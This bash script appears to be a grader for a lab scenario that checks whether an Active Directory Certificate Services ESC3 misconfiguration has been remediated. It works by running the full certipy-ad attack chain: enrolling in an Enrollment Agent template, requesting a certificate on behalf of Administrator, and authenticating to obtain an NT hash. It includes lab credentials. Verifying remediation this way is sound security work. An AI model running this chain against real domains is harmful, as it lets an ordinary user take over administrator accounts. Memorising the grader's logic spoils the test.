#!/usr/bin/env bash
# meta4/ad-vm/scenario-09/verify-poc.sh
# PASS (exit 0) iff alice cannot abuse the ESC3 Enrollment Agent template
# to request a cert on behalf of CORP\Administrator.

set -uo pipefail

# Tool preflight. /usr/bin/certipy-ad did not exist on the attacker: the
# provisioner pip-installed certipy-ad, whose console script is named
# `certipy`, then guarded its symlink on the filename `certipy-ad` -- so the
# link was silently skipped, and both fail-open branches below fired on every
# run. This scenario reported PASS on a fully vulnerable box.
# A missing grader dependency is a harness error, never a pass.
if [ ! -x /usr/bin/certipy-ad ]; then
    echo "[verify-poc-09] HARNESS ERROR: /usr/bin/certipy-ad missing or not executable" >&2
    exit 2
fi

cd "$(mktemp -d)" || { echo "[verify-poc-09] HARNESS ERROR: mktemp failed" >&2; exit 2; }

# Step 1: alice enrols in ESC3-Agent (the EKU=Certificate Request Agent template).
#
# -target is REQUIRED on BOTH enrollment steps: without it certipy sends the RPC
# request to -dc-ip, the DOMAIN CONTROLLER, which does not run CertSvc, and the
# run dies with ept_s_not_registered for ICertRequestD. -dc-ip is for
# LDAP/Kerberos only.
AGENT=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -target corp-ca01.corp.local \
    -dc-ip 10.20.30.5 \
    -template 'ESC3-Agent' 2>&1 </dev/null || true)
echo "--- agent enrol ---"; echo "$AGENT"

# --- CA not serving RPC: HARNESS ERROR, never a verdict ---
#
# ept_s_not_registered means the endpoint mapper has no ICertRequestD
# (91AE6020-9E3C-11CF-8D7C-00AA00C091BE) to hand out: the CA's enrollment
# interface is not reachable from here, which says nothing about whether the
# ESC3 template pair is still chainable.
#
# This used to fall through to exit 1, which is wrong in BOTH directions.
# Observed on the 2026-07-26 gate run: gates 1 AND 2 both hit this, so the
# vulnerable baseline "failed for the right reason" and the remediated host
# "was still vulnerable" -- on identical output that only ever meant the CA
# was unreachable. Exit 2 keeps it out of the evidence pool entirely.
#
# Both enrollment steps need this guard, so it is a function: an unreachable
# CA at the on-behalf-of step is exactly as much of a non-verdict as one at
# the agent step.
rpc_unreachable() {
    echo "$1" | grep -qiE 'ept_s_not_registered|Failed to get DCE RPC connection|Failed to get dynamic TCP endpoint'
}

if rpc_unreachable "$AGENT"; then
    echo "[verify-poc-09] HARNESS ERROR: CA RPC enrollment interface not registered (agent enrol)" >&2
    echo "[verify-poc-09] the CA is not serving ICertRequestD to this host -- fix the lab, not the scenario" >&2
    exit 2
fi

# --- step 1 denial ---
#
# CERTSRV_E_TEMPLATE_DENIED (0x80094012) and CERTSRV_E_ENROLL_DENIED
# (0x80094011) were absent and had to be added. They are what the CA answers
# when the vulnerable ENROLMENT RIGHTS on ESC3-Agent are revoked rather than
# the template unpublished -- remediation path 2 in the brief, and the fix that
# closes the chain at its root, which the brief's acceptance criterion calls
# the ideal outcome. Neither the symbol nor the message matched any existing
# alternative: the detail text is "The permissions on the certificate template
# do not allow the current user to enroll for this type of certificate", which
# contains neither "enrollment ... denied" nor "cannot enroll" nor
# "access_denied", so an ACL-only fix graded as an inconclusive FAIL.
#
# Exact wire strings, from impacket-0.13.1 hresult_errors.ERROR_MESSAGES
# (certipy/lib/errors.py::translate_error_code formats
# "code: 0x%x - <symbol> - <detail>" and certipy/lib/req.py logs it as
# "Got error while requesting certificate: ..."):
#   code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the
#     certificate template do not allow the current user to enroll for this
#     type of certificate.
#   code: 0x80094011 - CERTSRV_E_ENROLL_DENIED - The permissions on this CA do
#     not allow the current user to enroll for certificates.
#
# DELIBERATELY STEP 1 ONLY. The same codes are NOT added to the on-behalf-of
# check below: a permissions denial there means only ESC3-User was locked down
# while ESC3-Agent stayed enrollable, and the brief is explicit that a partial
# fix which still lets alice mint an enrollment-agent certificate does not pass.
#
# Cannot produce a false pass on an un-remediated host: the injected state
# GRANTS Domain Users the Certificate-Enrollment right on both templates, so a
# permissions denial can only be observed after somebody removed it.
if [ ! -f alice.pfx ]; then
    if echo "$AGENT" | grep -qiE 'template.*not found|access_denied|enrollment.*denied|cannot enroll|CERTSRV_E_UNSUPPORTED_CERT_TYPE|0x80094800|not supported by this CA|CERTSRV_E_TEMPLATE_DENIED|0x80094012|CERTSRV_E_ENROLL_DENIED|0x80094011'; then
        echo "[verify-poc-09] alice cannot enrol in ESC3-Agent -- BLOCKED"
        exit 0
    fi
    echo "[verify-poc-09] no agent PFX and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
    echo "[verify-poc-09] enrollment failing for an unknown reason is not evidence of remediation" >&2
    exit 1
fi

# Step 2: use the agent cert to request a cert ON BEHALF OF Administrator.
ONBEHALF=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -target corp-ca01.corp.local \
    -dc-ip 10.20.30.5 \
    -template 'ESC3-User' \
    -on-behalf-of 'CORP\Administrator' \
    -pfx alice.pfx 2>&1 </dev/null || true)
echo "--- on-behalf-of req ---"; echo "$ONBEHALF"

if rpc_unreachable "$ONBEHALF"; then
    echo "[verify-poc-09] HARNESS ERROR: CA RPC enrollment interface not registered (on-behalf-of)" >&2
    echo "[verify-poc-09] the CA is not serving ICertRequestD to this host -- fix the lab, not the scenario" >&2
    exit 2
fi

if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 /usr/bin/certipy-ad auth -pfx administrator.pfx -dc-ip 10.20.30.5 2>&1 || true)
    echo "--- auth ---"; echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-09] ESC3 still exploitable -- agent + on-behalf-of -> NT hash" >&2
        exit 1
    fi
fi

if echo "$ONBEHALF" | grep -qiE 'access_denied|enrollment.*denied|invalid.*signature'; then
    echo "[verify-poc-09] on-behalf-of issuance denied -- BLOCKED"
    exit 0
fi
# An enrollment-agent certificate WAS issued to alice (we only reach here if
# alice.pfx exists). That alone is the ESC3 precondition, so an unexplained
# failure at the on-behalf-of step is not evidence the template was fixed.
#
# A CERTIFICATE ISSUED TO ALICE AT THE ON-BEHALF-OF STEP ALSO LANDS HERE, AND
# THAT IS DELIBERATE. Removing the on-behalf-of requirement (clearing
# msPKI-RA-Application-Policies and setting msPKI-RA-Signature = 0 on
# ESC3-User) can leave the CA issuing an ordinary certificate for the signer
# instead of refusing, with no denial string. scenario-10 has a PASS branch for
# that shape of outcome; this scenario deliberately does not. ESC3-Agent stays
# published and enrollable by any domain user in every such fix, so alice can
# still mint an enrollment-agent certificate -- which threat.md names as the
# finding itself, and its acceptance criterion requires refusal, ideally at
# step 1. Do not port scenario-10's branch here without changing both.
echo "[verify-poc-09] alice holds an enrollment-agent cert but the on-behalf-of step gave no clear result" >&2
echo "[verify-poc-09] INCONCLUSIVE, grading FAIL - the ESC3 precondition is still present" >&2
exit 1
